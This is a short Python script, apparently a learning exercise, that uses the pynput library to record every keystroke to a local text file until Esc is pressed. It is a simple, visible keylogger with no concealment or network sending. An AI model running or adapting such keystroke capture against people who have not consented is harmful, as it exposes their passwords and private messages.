print('This is the main file')

from pynput import keyboard
#from pynput.keyboard import Listener
#from pynput.mouse import Listener

'''def keyboard_clicks(key):
    print(f"{key} pressed")

keyboard_clicks'''
#open File where the keystorkes will be recorded
Storage = open("Keyboard_Save.txt", "a")

from pynput.keyboard import Listener

#Fucntion with application of recording keystokes
def on_press(key):
    Storage.write(f'{key}')
    print(f'{key} pressed')
    if key == keyboard.Key.esc:
        return False  
        # Stop listener

'''def on_release(key):
    print(f'{key} released')'''


with Listener(on_press=on_press) as listener:
    listener.join()

Storage.close() #Closing file